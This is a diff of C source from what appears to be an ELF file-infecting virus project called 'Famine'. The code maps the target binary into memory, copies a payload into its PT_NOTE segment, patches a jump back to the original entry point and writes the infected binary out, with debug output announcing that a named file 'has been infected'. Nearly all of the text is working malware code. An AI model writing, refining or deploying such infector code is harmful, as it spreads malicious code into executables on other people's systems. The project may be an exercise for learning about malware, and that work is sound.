@@ -6,7 +6,7 @@
 
 static void write_on_memory(const struct s_info *info, char *ptr)
 {
-	unsigned long index = 0;
+	size_t index = 0;
 	char *dst = ptr;
 	char *src = info->ptr;
 	
@@ -30,45 +30,44 @@ static void write_on_memory(const struct s_info *info, char *ptr)
 static void replicate_on_memory(const struct s_info *info, char *ptr)
 {
 	char *dst;
-	unsigned char *src;
-	unsigned long back = 0;
-	const Elf64_Addr entry_point = info->old_entry - (info->new_entry) - 66;
+	uint8_t *src;
+	const Elf64_Addr entry_point = info->old_entry - (info->new_entry) - JMP_OFFSET;
 
 	dst = ptr + info->note->p_offset;
-	src = (unsigned char *)&constructor;
+	src = (uint8_t *)&constructor;
 
-	for (unsigned long index = 0; index < PAYLOAD_SIZE; index++)
-	{
-		if (*src== 0xe9 && back == 0)
-			back = index + 1;
+	for (size_t index = 0; index < PAYLOAD_SIZE; index++)
 		*dst++ = *src++;
-	}
 
-	_memcpy(ptr + info->note->p_offset + back, &entry_point, sizeof(int));
+	_memcpy(ptr + info->note->p_offset + (JMP_OFFSET - sizeof(JMP_OPCODE)), &entry_point, sizeof(int32_t));
 }
 
 ////////////////////////////////////////////////////////////////////////////////
 /// PUBLIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
-void inject(const struct s_info *info, const unsigned long m_entry, const int trace)
+void inject(const struct s_info *info, const size_t m_entry)
 {
 	char *ptr;
 
 	if ((ptr = _mmap(NULL, info->note->p_offset + PAYLOAD_SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
-		Exit(0);
+		return ;
 
 	write_on_memory(info, ptr);
 	replicate_on_memory(info, ptr);
 
-	if (_write(info->fd, ptr, info->note->p_offset + PAYLOAD_SIZE) < 0)
-		Exit(0);
-
+	_write(info->fd, ptr, info->note->p_offset + PAYLOAD_SIZE);
 	_munmap(ptr, info->note->p_offset + PAYLOAD_SIZE);
 
-#ifdef DEBUG
-	char buf1[] = "binary has been infected\n\n";
-	_write(trace, buf1, _strlen(buf1));
+
+#if DEBUG
 	(void)m_entry;
+
+	char fam[] = "\033[0;32mFamine\033[0m: ";
+	char des[] = " has been infected\n\n";
+
+	_write(1, fam, _strlen(fam)); 
+	_write(1, info->name, _strlen(info->name));
+	_write(1, des, _strlen(des)); 
 #endif
 }
